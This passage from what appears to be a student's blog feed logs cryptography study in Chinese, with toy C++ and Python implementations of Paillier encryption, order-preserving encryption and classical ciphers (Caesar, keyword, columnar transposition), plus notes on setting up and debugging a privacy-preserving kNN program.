Crea_Key(int&amp; p, int&amp; q, long long&amp; g, int&amp; Lam)//密钥生成，公钥（n，g），私钥Lam&#123;    int item1, item2;    while(true)    &#123;        item1 = Pseudo_prime();        item2 = Pseudo_prime();        if (MillerRabin(item1) &amp;&amp; MillerRabin(item2) &amp;&amp; gcd(item1 * item2, (item1 - 1) * (item2 - 1)) == 1)        &#123;            p = item1;            q = item2;            break;        &#125;    &#125;    long long n = p * q;    Lam = (p - 1) * (q - 1) / gcd((p - 1), (q - 1));    cout &lt;&lt; &quot;p=&quot; &lt;&lt; p &lt;&lt; &quot;  q=&quot; &lt;&lt; q &lt;&lt; &quot;  n=&quot; &lt;&lt; n &lt;&lt; &quot;  Lam=&quot; &lt;&lt; Lam;    srand(TIME);    for (g = n + 1;; g++)    &#123;        if (gcd(L(pow_mod_1(g, Lam, n * n), n), n) == 1)            break;    &#125;    cout &lt;&lt; &quot;   g=&quot; &lt;&lt; g &lt;&lt; endl;&#125;long long Encrypt(int&amp; m, long long n, long long&amp; g)//加密&#123;    int r;    long long item, item1, item2;    srand(TIME);    r = rand() % n;    item1 = pow_mod_1(g, m, n * n);    item2 = pow_mod_1(r, n, n * n);    item = item1 * item2 % (n * n);    return item;&#125;int Decrypt(long long&amp; c, long long n, int&amp; Lam, long long&amp; g)//解密&#123;    int item1, item2, item3, item4;//item3为item2模n的逆，item4为丢弃值    item1 = L(pow_mod_1(c, Lam, n * n), n);    item2 = L(pow_mod_1(g, Lam, n * n), n);    e_gcd(n, item2, item4, item3);    if (item3 &lt; 0)        item3 = (item3 % n) + n;    return item1 * item3 % n;&#125;int main()&#123;    int p, q, Lam, m;    long long c, g, n;    Crea_Key(p, q, g, Lam);    n = p * q;    cout &lt;&lt; &quot;请输入0~&quot; &lt;&lt; p * q &lt;&lt; &quot;的明文：&quot;;    cin &gt;&gt; m;    c = Encrypt(m, n, g);    cout &lt;&lt; &quot;加密后的密文为c=&quot; &lt;&lt; c &lt;&lt; endl;    m = Decrypt(c, n, Lam, g);    cout &lt;&lt; &quot;解密后的明文为m=&quot; &lt;&lt; m &lt;&lt; endl;    return 0;&#125;</code></pre><h3 id="6、其他"><a href="#6、其他" class="headerlink" title="6、其他"></a>6、其他</h3><ul><li><p><strong>Cramer-Shoup 加密</strong>、<strong>BLS短签名</strong>、<strong>ZSS短签名</strong>、<strong>BB短签名</strong>：原理已经理解，还没开始编写程序<br>参考：<br><a href="https://blog.csdn.net/qq_26816591/article/details/83013703">Cramer-Shoup非对称公钥密码体制</a><br><a href="https://blog.csdn.net/zmrlinux/article/details/107953534">Cramer-Shoup 密码系统 安全证明 内容小结</a><br><a href="https://www.cnblogs.com/lsgxeva/p/12021659.html">理解 BLS 签名算法</a></p></li><li><p>目前存在的问题：</p><ol><li>基于身份的加密体制原理还不太理解</li><li>哈希函数原理理解，但不知道如何代码实现</li><li>对于曲线哈希和曲线配对的理解还存在问题</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Record（3）</title>
      <link href="/2021/09/24/Record%EF%BC%883%EF%BC%89/"/>
      <url>/2021/09/24/Record%EF%BC%883%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Record（3）"><a href="#Record（3）" class="headerlink" title="Record（3）"></a>Record（3）</h1><h2 id="一、安装论文中程序"><a href="#一、安装论文中程序" class="headerlink" title="一、安装论文中程序"></a>一、安装论文中程序</h2><p>程序地址：<a href="https://github.com/jamesdu0504/Practical-Cryptdb">https://github.com/jamesdu0504/Practical-Cryptdb</a></p><h4 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h4><p><img src="/../pic/Cache_72712e9f951d7f23..jpg" alt="Cache_72712e9f951d7f23."></p><h5 id="Bug-1：执行命令8时，出现错误"><a href="#Bug-1：执行命令8时，出现错误" class="headerlink" title="Bug.1：执行命令8时，出现错误"></a>Bug.1：执行命令8时，出现错误</h5><p><img src="/../pic/3.bug1.jpg" alt="3.bug1"></p><p><strong>原因：make install的时候要提权</strong></p><h5 id="Bug-2：执行命令14时，出现错误"><a href="#Bug-2：执行命令14时，出现错误" class="headerlink" title="Bug.2：执行命令14时，出现错误"></a>Bug.2：执行命令14时，出现错误</h5><p><img src="/../pic/3.bug2.jpg" alt="3.bug2"></p><p><strong>原因:mpfr没装好导致flint编译失败</strong></p><h5 id="Bug-3：输入make指令报错ntl有问题，多次重装虚拟机无果"><a href="#Bug-3：输入make指令报错ntl有问题，多次重装虚拟机无果" class="headerlink" title="Bug.3：输入make指令报错ntl有问题，多次重装虚拟机无果"></a>Bug.3：输入make指令报错ntl有问题，多次重装虚拟机无果</h5><p>原因：使用32bit镜像无法配置库，应该使用64bit</p><p><img src="/../pic/3.bug3.jpg" alt="3.bug3"></p><p>重装系统，配置完成后，make成功</p><h2 id="二、运行程序"><a href="#二、运行程序" class="headerlink" title="二、运行程序"></a>二、运行程序</h2><h5 id="1、编译完成后，使用指令-x2F-knn-x2F-iris-x2F-iris-data-3"><a href="#1、编译完成后，使用指令-x2F-knn-x2F-iris-x2F-iris-data-3" class="headerlink" title="1、编译完成后，使用指令.&#x2F;knn  .&#x2F;iris&#x2F;iris.data 3"></a>1、编译完成后，使用指令.&#x2F;knn  .&#x2F;iris&#x2F;iris.data 3</h5><p>运行完指令1后，预测结果均为666</p><p><img src="/../pic/666.jpg" alt="666"></p><p>此输出为程序中自己设计<br>出现666的原因是python的一个库没有安装，阅读python代码后安装库</p><p>再次输入指令，结果正确</p><p><img src="/../pic/run1.png" alt="run1"></p><p><img src="/../pic/run1.1.jpg" alt="run1.1"></p><h5 id="2、使用python程序收集结果"><a href="#2、使用python程序收集结果" class="headerlink" title="2、使用python程序收集结果"></a>2、使用python程序收集结果</h5><p><img src="/../pic/run2.jpg" alt="run2"></p>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Record（2）</title>
      <link href="/2021/05/24/Record%EF%BC%882%EF%BC%89/"/>
      <url>/2021/05/24/Record%EF%BC%882%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Record（2）"><a href="#Record（2）" class="headerlink" title="Record（2）"></a>Record（2）</h1><h2 id="非交互式knn隐私保护分类器"><a href="#非交互式knn隐私保护分类器" class="headerlink" title="非交互式knn隐私保护分类器"></a>非交互式knn隐私保护分类器</h2><h2 id="一、用途"><a href="#一、用途" class="headerlink" title="一、用途"></a>一、用途</h2><p>对存储在云中的私有数据库运行查询</p><h2 id="二、基本概念"><a href="#二、基本概念" class="headerlink" title="二、基本概念"></a>二、基本概念</h2><h3 id="1、kNN分类器"><a href="#1、kNN分类器" class="headerlink" title="1、kNN分类器"></a>1、kNN分类器</h3><p>1）<strong>特点：</strong>无监督机器学习</p><p>2）<strong>分类：</strong>（通常采用欧氏距离）</p><p>未加权（选择距离最小的k个实例）</p><p>加权（距离的倒数作为k个邻居中每个邻居的投票权重）</p><h3 id="2、保序加密"><a href="#2、保序加密" class="headerlink" title="2、保序加密"></a>2、保序加密</h3><p><strong>功能：</strong>密文保持明文的数字顺序</p><p><strong>加密原理：</strong></p><p><img src="/../pic/%E4%BF%9D%E5%BA%8F%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86.png" alt="保序加密原理"></p><p><strong>解密原理：</strong>反向查表</p><p>参考文章：<a href="https://blog.csdn.net/qq_37150711/article/details/111348696">密码学——保序加密算法</a></p><pre><code class="python">import csvimport randomimport numpy as npkey_table = &quot;BCLO09.csv&quot;def HGD(D, R):    len_D = len(D)    len_R = len(R)    y = int(len_R / 2)    x = np.random.hypergeometric(len_D, len_R, y, size=1)    a = x[0]    if x[0] &gt;= len_D:        a = len_D - 1    return D[a]def writeCsv(path, data, modle): #传入变量csv文件的路径和要写入的数据    with open(path,modle,newline=&quot;&quot;) as f: # 以写入的方式打开文件，newline=&quot;&quot; 可以让数据不隔行写入        writer_csv=csv.writer(f) #调用csv的writer方法往文件里面写入数据，并赋值给writer_scv变量        writer_csv.writerow(data) #把数据循环写入到writer_csv变量中#读取csv文件def readCsv(path): #传入变量csv文件的路径    list_one=[]    #定义一个空列表    with open(path,&quot;r&quot;) as f: #以只读的方式打开文件        read_scv=csv.reader(f) #调用csv的reader方法读取文件并赋值给read_scv变量        for i in read_scv:            list_one.append(i) #将读取到的数据追加到list列表里面    return list_one #返回列表数据def key_tableIsContain(param):    list_one = readCsv(key_table)    if len(list_one) == 0:        return 0, 0    flag = 0    for i in range(len(list_one)):        if str(int(param)) == list_one[i][0]:            flag = 1            return 1, int(list_one[i][1])    if flag != 1:        return 0, 0def Enc2(key_table, D, R, m):    _D = D    _R = R    M = max(D) - min(D) + 1    N = max(R) - min(R) + 1    center = int((max(R) + min(R)) / 2)    iscontain, values = key_tableIsContain(center)    if iscontain == 1:        c = values #记录D中的抽样值        x = values    else:        x = HGD(D, R)        a = []        a.append(center)        a.append(x)        writeCsv(key_table, a ,&quot;a&quot;)    print(&quot;区间是D[%d, %d]&quot; % (min(_D), max(_D)))    print(&quot;区间是R[%d, %d]&quot; % (min(_R), max(_R)))    if M == 1:        print(m)        print(&quot;区间是R[%d, %d]&quot; % (min(_R), max(_R)))        # return random.randint(min(R), max(R))        return str(m) + &quot; &quot; + str(min(R)) + &quot; &quot; + str(max(R))    if M == 2:        print(m)        if min(D) == m:            print(&quot;最后的区间是R(%d, %d]&quot; % (min(_R), center))            return str(m) + &quot; &quot; + str(min(R)) + &quot; &quot; + str(center)        else:            print(&quot;最后的区间是R(%d, %d]\n&quot; % (center, max(_R)))            return str(m) + &quot; &quot; + str(center) + &quot; &quot; + str(max(R))        # return random.randint(min(R), max(R))    if m &lt;= x: #左边        D = []        for i in range(min(_D), x + 1):            D.append(i)        R = []        for j in range(min(_R), center + 1):            R.append(j)    else:  #右边        D = []        for i in range(x + 1, max(_D) + 1):            D.append(i)        R = []        for j in range(center + 1, max(_R) + 1):            R.append(j)    print(&quot;D[%d, %d] 抽样值:%d&quot;%(min(_D), max(_D), x))    print(&quot;R[%d, %d] 中间值:%d \n&quot; % (min(_R), max(_R), center))    return Enc2(key_table, D, R, m)def Dnc2(key_table, D, R, m):    _D = D    _R = R    M = max(D) - min(D) + 1    N = max(R) - min(R) + 1    center = int((max(R) + min(R)) / 2)    print(&quot;区间是D[%d, %d]&quot; % (min(_D), max(_D)))    print(&quot;区间是R[%d, %d]&quot; % (min(_R), max(_R)))    if M == 1:        print(m)        print(&quot;明文是：%d\n区间是R[%d, %d]&quot; % (min(D), min(_R), max(_R)))        return random.randint(min(R), max(R))    if M == 2:        if m &lt;= center:            print(&quot;明文是：%d\n最后的区间是R(%d, %d]&quot; % (min(D), min(_R), center))        else:            print(&quot;明文是：%d\n最后的区间是R[%d, %d)\n&quot; % (max(D), center, max(_R)))        return random.randint(min(R), max(R))    iscontain, values = key_tableIsContain(center)    if iscontain == 1:        c = values  # 记录D中的抽样值        x = values    else:        print(&quot;可能解密错误！&quot;)        return        x = HGD(D, R)        a = []        a.append(center)        a.append(x)        # writeCsv(key_table, a, &quot;a&quot;)    if m &lt;= center:  # 左边        D = []        for i in range(min(_D), x + 1):            D.append(i)        R = []        for j in range(min(_R), center + 1):            R.append(j)    else:  # 右边        D = []        for i in range(x + 1, max(_D) + 1):            D.append(i)        R = []        for j in range(center + 1, max(_R) + 1):            R.append(j)    return Dnc2(key_table, D, R, m)if __name__ == &#39;__main__&#39;:    # searchContentList = searchContent()    # print(searchContentList)    # Back()    while (1):        print(&quot;=================\n&quot;              &quot;\t1、加密\n&quot;              &quot;\t2、解密\n&quot;              &quot;\t3、循环加密\n&quot;              &quot;=================&quot;)        flag = input(&quot;请输入你要操作的编号：&quot;)        if flag == &quot;1&quot;:            D = []            for i in range(100):                D.append(i + 1)            R = []            for i in range(1000):                R.append(i + 1)            m = input(&quot;请输入你要加密的数字&quot;)            Enc2(key_table, D, R, int(m))        if flag == &quot;2&quot;:            D = []            for i in range(100):                D.append(i + 1)            R = []            for i in range(1000):                R.append(i + 1)            m = input(&quot;请输入你要解密的数字&quot;)            Dnc2(key_table, D, R, int(m))        if flag == &quot;3&quot;:            D = []            result = []            for i in range(100):                D.append(i + 1)            R = []            for i in range(1000):                R.append(i + 1)            for i in range(100):                result.append(Enc2(key_table, D, R, int(i + 1)))            for c in range(len(result)):                print(result[c])</code></pre><h3 id="3、同态加密"><a href="#3、同态加密" class="headerlink" title="3、同态加密"></a>3、同态加密</h3><p><strong>功能：</strong>经过同态加密的数据进行处理得到的结果与用相同方法处理未加密得到的结果相同</p><h4 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h4><p><img src="/../pic/%E6%96%B9%E6%A1%88%E4%B8%80.jpg" alt="方案一"></p><h4 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h4><p>参考文章：<a href="https://blog.csdn.net/qq_33885461/article/details/86555560">Paillier cryptosystem（Paillier 密码系统）</a></p><p><img src="/../pic/%E6%96%B9%E6%A1%88%E4%BA%8C.jpg" alt="方案二"></p><h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><ol><li>明文版本的k-NN比加密版本的速度快15倍。</li><li>该隐私保护方法不会丢失显著的分类准确性</li><li>该方案可能容易受到基于频率分析的推理攻击<br>改进方法：数据混淆和扰动技术</li><li>执行时间随实例数量呈线性增长</li><li>计算每个距离的时间也随相关向量的维数线性增长</li></ol><h2 id="四、其他方案"><a href="#四、其他方案" class="headerlink" title="四、其他方案"></a>四、其他方案</h2><ol><li>各方分别持有同一组数据的不同属性，分别计算各自分区内实例与查询向量的距离，加同态加密方案和随机扰动技术把这些距离结合起来找到k个最近邻(Zhan等，2005)（交互）</li><li>几个数据所有者每个人都有一个私有数据库，新实例的分类由每个用户在自己的数据库中执行，根据每个数据库的k个最近邻对实例进行分类（Xiong等人，2006；Xiong等人，2007）（交互）</li><li>三种保护数据隐私的方法来找到k个最邻近的邻居（Choi等，2014）（不执行分类问题）（交互）</li><li>数据所有者对数据进行加密并将其发送到云，其他用户可以提交查询向量以保持隐私的方式获得最近的邻居。（Zhu等，2013）（不执行分类问题）（交互）</li><li>据所有者加密数据并将其提交给第一台服务器，然后将密钥发送给第二台服务器，向第一台服务器发送查询向量，第一与第二服务器运行分布式交互式协议，最后第一服务器返回k个最近的邻居（Elmehdwi等，2014）（共谋）</li><li>该方案保留了一种特殊类型的标量积，允许在不需要交互过程的情况下找到k个最接近的向量。服务器通过计算加密向量的内积来计算数据集向量之间的内积，确定更接近查询向量的向量。(Wong et al.，2009)（不执行分类问题）</li></ol><h2 id="五、疑问"><a href="#五、疑问" class="headerlink" title="五、疑问"></a>五、疑问</h2><ol><li>对于kNN，为什么要采用保序+同态方案？为什么不能仅使用同态？</li><li>在Linux下运行是否是因为该方案将应用于云环境？</li></ol>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Record（1）</title>
      <link href="/2021/04/06/Record%EF%BC%881%EF%BC%89/"/>
      <url>/2021/04/06/Record%EF%BC%881%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="1、凯撒密码"><a href="#1、凯撒密码" class="headerlink" title="1、凯撒密码"></a>1、凯撒密码</h2><h3 id="1、初步搭建框架"><a href="#1、初步搭建框架" class="headerlink" title="1、初步搭建框架"></a>1、初步搭建框架</h3><p><img src="/../../../../../pic/%E6%A1%86%E6%9E%B6.jpg" alt="框架"></p><pre><code class="c++">string input()//用户输入明文&#123;    string plaintext;    cout &lt;&lt; &quot;请输入明文:&quot; &lt;&lt; endl;    cin &gt;&gt; plaintext;    return plaintext;&#125;</code></pre><h3 id="2、如何计算字符串长度"><a href="#2、如何计算字符串长度" class="headerlink" title="2、如何计算字符串长度"></a>2、如何计算字符串长度</h3><p>目的：作为循环条件<br>解决：string库中包含计算字符串长度函数<br>用法：</p><pre><code class="c++">string plaintext;int num;num = plaintext.size();</code></pre><p>经过多次思考，没有必要计算字符串长度</p><pre><code class="c++">for (i = 0; plaintext[i] != 0; i++)    &#123;&#125;</code></pre><h3 id="3、将明文转换为一串数字"><a href="#3、将明文转换为一串数字" class="headerlink" title="3、将明文转换为一串数字"></a>3、将明文转换为一串数字</h3><p><img src="/../../../../../pic/%E5%B0%86%E6%98%8E%E6%96%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%B8%80%E4%B8%B2%E6%95%B0%E5%AD%97.jpg" alt="将明文转换为一串数字"></p><h3 id="4、设计密文生成算法"><a href="#4、设计密文生成算法" class="headerlink" title="4、设计密文生成算法"></a>4、设计密文生成算法</h3><pre><code class="c++">for (i = 0; a[i] != 0; i++)&#123;    if (a[i] &gt; 64 &amp;&amp; a[i] &lt; 91)//如果是大写字母    &#123;        if (a[i] + num &lt; 65)            b[i] = a[i] + num +26;        else if (a[i] + num &gt;= 65 &amp;&amp; a[i] + num &lt;= 90)            b[i] = a[i] + num;        else            b[i] = a[i] + num - 26;    &#125;        else if (a[i] &gt; 96 &amp;&amp; a[i] &lt; 123)//如果是小写字母    &#123;        if (a[i] + num &lt; 97)            b[i] = a[i] + num + 26;        else if (a[i] + num &gt;= 97 &amp;&amp; a[i] + num &lt;= 122)            b[i] = a[i] + num;        else            b[i] = a[i] + num - 26;    &#125;&#125;</code></pre><h3 id="5、最终成果"><a href="#5、最终成果" class="headerlink" title="5、最终成果"></a>5、最终成果</h3><pre><code class="c++">#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;string input()//用户输入明文&#123;    string plaintext;    cout &lt;&lt; &quot;请输入明文:&quot; &lt;&lt; endl;    cin &gt;&gt; plaintext;    return plaintext;&#125;void key(string plaintext)//形成密文，并输出&#123;    int i;    int num = 0;    int a[1000] = &#123; 0 &#125;;//明文    int b[1000] = &#123; 0 &#125;;//密文    for (i = 0; plaintext[i] != 0; i++)//将明文转化为一个由ASCⅡ表对应数字的数组    &#123;        a[i] = (int)plaintext[i];    &#125;    cout &lt;&lt; &quot;请输入您想位移的数字：（正数—右移，负数—左移）&quot; &lt;&lt; endl;    cin &gt;&gt; num;    for (i = 0; a[i] != 0; i++)    &#123;        if (a[i] &gt; 64 &amp;&amp; a[i] &lt; 91)//如果是大写字母        &#123;            if (a[i] + num &lt; 65)                b[i] = a[i] + num +26;            else if (a[i] + num &gt;= 65 &amp;&amp; a[i] + num &lt;= 90)                b[i] = a[i] + num;            else                b[i] = a[i] + num - 26;        &#125;        else if (a[i] &gt; 96 &amp;&amp; a[i] &lt; 123)//如果是小写字母        &#123;            if (a[i] + num &lt; 97)                b[i] = a[i] + num + 26;            else if (a[i] + num &gt;= 97 &amp;&amp; a[i] + num &lt;= 122)                b[i] = a[i] + num;            else                b[i] = a[i] + num - 26;        &#125;    &#125;    cout &lt;&lt; &quot;密文为：&quot;;    for (i = 0; b[i] != 0; i++)        cout &lt;&lt; (char)b[i] ;    cout &lt;&lt; &quot;\n&quot;;&#125;int main()&#123;    string plaintext;    int i;        plaintext = input();//输入明文        key(plaintext);        system(&quot;pause&quot;);    return 0;&#125;</code></pre><h3 id="6、测试"><a href="#6、测试" class="headerlink" title="6、测试"></a>6、测试</h3><p><img src="/../../../../../pic/%E6%B5%8B%E8%AF%951-16511498414984.jpg" alt="测试1"><br>任务文件中示例<br><img src="/../../../../../pic/%E6%B5%8B%E8%AF%952.jpg" alt="测试2"></p><h2 id="2、关键字密码"><a href="#2、关键字密码" class="headerlink" title="2、关键字密码"></a>2、关键字密码</h2><h3 id="1、初步搭建框架-1"><a href="#1、初步搭建框架-1" class="headerlink" title="1、初步搭建框架"></a>1、初步搭建框架</h3><p><img src="/../../../../../pic/%E6%A1%86%E6%9E%B6-16511498597877.jpg" alt="框架"></p><p>这个框架仅为初步搭建，后期的编写中再次对框架进行修改，但解决问题的流程大致没变</p><blockquote><p>本次编写是我首次运用了面向对象的方法，对方法进行了封装</p></blockquote><h3 id="2、class中的属性"><a href="#2、class中的属性" class="headerlink" title="2、class中的属性"></a>2、class中的属性</h3><p><img src="/../../../../../pic/%E5%B1%9E%E6%80%A7.jpg" alt="属性"></p><h3 id="3、生成密码表"><a href="#3、生成密码表" class="headerlink" title="3、生成密码表"></a>3、生成密码表</h3><p><img src="/../../../../../pic/%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81%E8%A1%A8.jpg" alt="生成密码表"></p><h3 id="4、将明文转化为密文"><a href="#4、将明文转化为密文" class="headerlink" title="4、将明文转化为密文"></a>4、将明文转化为密文</h3><p><img src="/../../../../../pic/%E5%B0%86%E6%98%8E%E6%96%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AF%86%E6%96%87.jpg" alt="将明文转换为密文"></p><h3 id="5、最终成果-1"><a href="#5、最终成果-1" class="headerlink" title="5、最终成果"></a>5、最终成果</h3><pre><code class="c++">#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;class KeyWord_class&#123;public://方法    void input(string plaintext)//用户输入明文    &#123;        int i;        for (i = 0; (int)plaintext[i] != 0; i++)            m_Plaintext[i] = (int)plaintext[i];//将字符转换为数字    &#125;    void keyword(string keyword)//用户输入关键字    &#123;        m_keyword = keyword;    &#125;    void turn01(string keyword)//生成密码表    &#123;        int i, j;//循环变量        int s = 0;//状态变量，1—存在，0—不存在        int letter = 0;        int list[26] = &#123; 0 &#125;;//存放字母表的整形数组        int num = keyword.size();        for (i = 0; i &lt; num; i++)        &#123;            list[i] = (int)keyword[i];//先把关键字转换为数字形式放入字母表        &#125;        letter = list[num - 1] + 1;        for (i = num; i &lt; 26; i++)//接着关键字继续放入其余字母        &#123;            for (j = 0; j &lt; num; j++)//依次查看关键字中每个字母            &#123;                if (list[j] == letter)//如果已经存在该字母，使s变为1                &#123;                    s = 1;                &#125;            &#125;            if (s == 1)                i--;            else//如果不存在该字母，接着关键字放入字母            &#123;                if (letter &gt; 90)//如果超过Z，从A开始                    letter = 65;                list[i] = letter;            &#125;            letter++;            s = 0;//重置状态变量        &#125;        for (i = 0; i &lt; 26; i++)//放入字母表        &#123;            m_list[i] = list[i];        &#125;    &#125;    void turn02()//将明文转换为密文    &#123;        int i, j;        for (i = 0; m_Plaintext[i] != 0; i++)//依次在明文中遍历        &#123;            for (j = 0; j &lt; 26; j++)//在字母表中查找            &#123;                if (m_Plaintext[i] - 65 == j)                &#123;                    m_ciphertext[i] = m_list[j];                &#125;            &#125;        &#125;    &#125;    void output01(int list[26])    &#123;        int i;        for (i = 0; i &lt; 26; i++)        &#123;            cout &lt;&lt; (char)list[i];        &#125;        cout &lt;&lt; &quot;\n&quot;;    &#125;    void output()    &#123;        int i;        for (i = 0; m_ciphertext[i] != 0; i++)        &#123;            cout &lt;&lt; (char)m_ciphertext[i];        &#125;        cout &lt;&lt; &quot;\n&quot;;    &#125;private:    //属性    int m_Plaintext[1000] = &#123; 0 &#125;;//明文    string m_keyword;//关键字    int m_list[26] = &#123; 0 &#125;;//字母表    int m_ciphertext[1000] = &#123; 0 &#125;;//密文&#125;;int main()&#123;    KeyWord_class k;//创建一个对象，类的实例化    string plaintext;    string keyword;    //输入明文    cout &lt;&lt; &quot;请输入明文（大写字母）：&quot; &lt;&lt; endl;    cin &gt;&gt; plaintext;    k.input(plaintext);    //输入关键字    cout &lt;&lt; &quot;请输入关键字：&quot; &lt;&lt; endl;    cin &gt;&gt; keyword;    k.keyword(keyword);    //生成字母表    k.turn01(keyword);    //明文转化为密文    k.turn02();    //输出密文    cout &lt;&lt; &quot;输出密文：&quot; &lt;&lt; endl;    k.output();    system(&quot;pause&quot;);    return 0;&#125;</code></pre><h3 id="6、测试-1"><a href="#6、测试-1" class="headerlink" title="6、测试"></a>6、测试</h3><p><img src="/../../../../../pic/%E6%88%90%E5%8A%9F.jpg" alt="成功"></p><h2 id="3、纵栏式移项密码"><a href="#3、纵栏式移项密码" class="headerlink" title="3、纵栏式移项密码"></a>3、纵栏式移项密码</h2><h3 id="1、框架"><a href="#1、框架" class="headerlink" title="1、框架"></a>1、框架</h3><p><img src="/../../../../../pic/%E6%A1%86%E6%9E%B6-165114989857313.jpg" alt="框架"></p><h3 id="2、对关键字排序"><a href="#2、对关键字排序" class="headerlink" title="2、对关键字排序"></a>2、对关键字排序</h3><pre><code class="c++">void sort()//对关键字排序    &#123;        int m, n;        int i, j;        int a[10] = &#123; 0 &#125;;        for (i = 0; i &lt; 10; i++)//对关键字排序        &#123;            for (m = 0, n = 1; n &lt; 10; n++)//m为这个数组中最大元素            &#123;                if (m_keyword[m] &lt; m_keyword[n])                    m = n;            &#125;            a[i] = (m == m_num - 1 ? 0 : m + 1);            m_keyword[m] = 0;        &#125;        for (i = m_num - 1, j = 0; i &gt; -1; i--, j++)//将密码表内数字按从小到大的顺序放入        &#123;            m_keyword[j] = a[i];        &#125;    &#125;</code></pre><h3 id="3、将明文转化为密文"><a href="#3、将明文转化为密文" class="headerlink" title="3、将明文转化为密文"></a>3、将明文转化为密文</h3><pre><code class="c++">void turn()//将明文转化为密文    &#123;        int i, j, k = 0;        for (i = 0; i &lt; m_num; i++)        &#123;            for (j = 0; m_plaintext[j] != 0; j++)            &#123;                if ((j + 4) % m_num == m_keyword[i])                &#123;                    m_ciphertext[k] = m_plaintext[j];                    k++;                &#125;            &#125;        &#125;    &#125;</code></pre><p>这里的难点主要是需要搞清楚每个变量所代表的含义</p><h3 id="4、最终成果"><a href="#4、最终成果" class="headerlink" title="4、最终成果"></a>4、最终成果</h3><pre><code class="c++">#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;class column&#123;public:    void input(string plaintext)//输入明文，并转换为数字    &#123;        int i;        for (i = 0; plaintext[i] != 0; i++)        &#123;            m_plaintext[i] = plaintext[i];        &#125;    &#125;    void put_keyword(string keyword)//输入关键字，并转化为数字    &#123;        int i;        m_num = keyword.size();        if (m_num &gt; 11)            return;        for (i = 0; keyword[i] != 0; i++)        &#123;            m_keyword[i] = keyword[i];        &#125;    &#125;    void sort()//对关键字排序    &#123;        int m, n;        int i, j;        int a[10] = &#123; 0 &#125;;        for (i = 0; i &lt; 10; i++)//对关键字排序        &#123;            for (m = 0, n = 1; n &lt; 10; n++)//m为这个数组中最大元素            &#123;                if (m_keyword[m] &lt; m_keyword[n])                    m = n;            &#125;            a[i] = (m == m_num - 1 ? 0 : m + 1);            m_keyword[m] = 0;        &#125;        for (i = m_num - 1, j = 0; i &gt; -1; i--, j++)//将密码表内数字按从小到大的顺序放入        &#123;            m_keyword[j] = a[i];        &#125;    &#125;    void turn()//将明文转化为密文    &#123;        int i, j, k = 0;        for (i = 0; i &lt; m_num; i++)        &#123;            for (j = 0; m_plaintext[j] != 0; j++)            &#123;                if ((j + 4) % m_num == m_keyword[i])                &#123;                    m_ciphertext[k] = m_plaintext[j];                    k++;                &#125;            &#125;        &#125;    &#125;    void output()//输出密文    &#123;        int i;        for (i = 0; m_ciphertext[i] != 0; i++)        &#123;            cout &lt;&lt; (char)m_ciphertext[i];        &#125;        cout &lt;&lt; &quot;\n&quot;;    &#125;private:    int m_plaintext[1000] = &#123; 0 &#125;;//明文    int m_keyword[10] = &#123;0&#125;;//关键字    int m_num = 0;//关键字长度    int m_ciphertext[1000] = &#123; 0 &#125;;//密文&#125;;int main()&#123;    column c;    string plaintext;    string keyword;    cout &lt;&lt; &quot;请输入明文（大写字母）：&quot; &lt;&lt; endl;    cin &gt;&gt; plaintext;    c.input(plaintext);    cout &lt;&lt; &quot;请输入关键字（少于10个大写字母）：&quot; &lt;&lt; endl;    cin &gt;&gt; keyword;    c.put_keyword(keyword);    c.sort();//关键字排序    c.turn();//明文转密文    cout &lt;&lt; &quot;密文为：&quot; &lt;&lt; endl;//输出密文    c.output();    system(&quot;pause&quot;);    return 0;&#125;</code></pre><h3 id="5、测试"><a href="#5、测试" class="headerlink" title="5、测试"></a>5、测试</h3><p><img src="/../../../../../pic/%E6%B5%8B%E8%AF%95.jpg" alt="测试"></p><h2 id="4、中国式密码"><a href="#4、中国式密码" class="headerlink" title="4、中国式密码"></a>4、中国式密码</h2><h3 id="1、框架-1"><a href="#1、框架-1" class="headerlink" title="1、框架"></a>1、框架</h3><p><img src="/../../../../../pic/%E6%A1%86%E6%9E%B6-165114991661416.jpg" alt="框架"></p><h3 id="2、明文中偶数列逆置"><a href="#2、明文中偶数列逆置" class="headerlink" title="2、明文中偶数列逆置"></a>2、明文中偶数列逆置</h3><pre><code class="c++">void turn01()//明文中偶数列逆置    &#123;        int s = -1;//状态变量，1—奇，-1—偶        int i, j, k;//循环变量        int item = 0;//中间变量        for (i = 0; m_plaintext[i] != 0; i++)        &#123;            if (i % m_rownum == 0)            &#123;                s *= -1;            &#125;            if (i % m_rownum == 0 &amp;&amp; s == -1)            &#123;                for (j = i, k = 1; j &lt; (i + m_rownum - k); j++, k++)                &#123;                    item = m_plaintext[j];                    m_plaintext[j] = m_plaintext[i + m_rownum - k];                    m_plaintext[i + m_rownum - k] = item;                &#125;            &#125;        &#125;    &#125;</code></pre><h3 id="3、明文按行放置形成密文"><a href="#3、明文按行放置形成密文" class="headerlink" title="3、明文按行放置形成密文"></a>3、明文按行放置形成密文</h3><pre><code class="c++">void turn02()//明文按行放置形成密文    &#123;        int i, j, k = 0;        for (i = 1; i &lt; m_rownum; i++)//余数依次增大        &#123;            for (j = m_textnum; j &gt;= 0; j--)            &#123;                if (j % m_rownum == i)                &#123;                    m_ciphertext[k++] = m_plaintext[j - 1];                &#125;            &#125;        &#125;        for (j = m_textnum; j &gt;= 0; j--)//整除情况        &#123;            if (j % m_rownum == 0)                m_ciphertext[k++] = m_plaintext[j - 1];        &#125;    &#125;</code></pre><h3 